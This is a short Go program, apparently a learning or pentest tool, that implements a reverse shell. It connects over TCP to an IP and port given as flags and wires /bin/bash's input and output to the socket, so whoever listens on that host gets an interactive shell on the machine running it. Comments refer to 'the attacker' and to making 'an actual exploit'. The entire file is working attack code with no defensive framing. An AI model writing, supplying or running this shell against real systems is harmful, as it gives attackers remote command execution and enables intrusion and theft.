package main

import (
	"flag"
	"log"
	"net"
	"os/exec"
)

func Connect(i, p *string) {

	log.Println("Starting reverse shell")
	sock := *i + ":" + *p

	//start tcp server with specified ip address
	c, err := net.Dial("tcp", sock)
	if nil != err {
		log.Fatalf("Could not open TCP connection: %v", err)
	}

	//closes the connection at the end
	defer c.Close()

	//println to get feedback not good if you want to create an actual exploit
	log.Println("TCP connection established")

	//executes the commands from the attacker
	cmd := exec.Command("/bin/bash")
	cmd.Stdin = c
	cmd.Stdout = c
	cmd.Stderr = c
	cmd.Run()
}

func main() {

	//flags to specify ip address and port
	p := flag.String("p", "8080", "Port")
	c := flag.String("c", "", "Connect IP")
	flag.Parse()

	Connect(c, p)

}
